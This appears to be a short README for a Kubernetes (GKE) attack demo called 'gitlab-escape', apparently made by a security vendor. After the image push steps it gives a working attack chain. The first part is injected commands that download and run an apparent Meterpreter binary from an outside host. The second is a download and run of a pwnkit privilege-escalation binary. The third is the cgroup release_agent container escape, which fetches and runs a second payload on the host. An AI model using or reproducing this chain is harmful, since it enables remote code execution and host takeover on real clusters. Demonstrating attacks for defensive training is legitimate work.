## kubernetes cluster (gke)

gcloud auth configure-docker

docker tag gitlab-escape:latest gcr.io/mondoo-demo-sap/gitlab-escape (docker tag gitlab-escape:latest gcr.io/<project-id>/gitlab-escape)

docker push gcr.io/mondoo-demo-sap/gitlab-escape (docker push gcr.io/<project-id>/gitlab-escape)

```
;curl -vk http://btc.atomic111.de:8001/met-container -o /tmp/met

;chmod 777 /tmp/met

;/tmp/met
```

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

cd /tmp

curl -vkO https://pwnkit.s3.amazonaws.com/priv-es

chmod a+x ./priv-es

./priv-es
```

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://btc.atomic111.de:8001/met-host -o /run/met" >> /cmd
echo "chmod 777 /run/met" >> /cmd
echo "/run/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
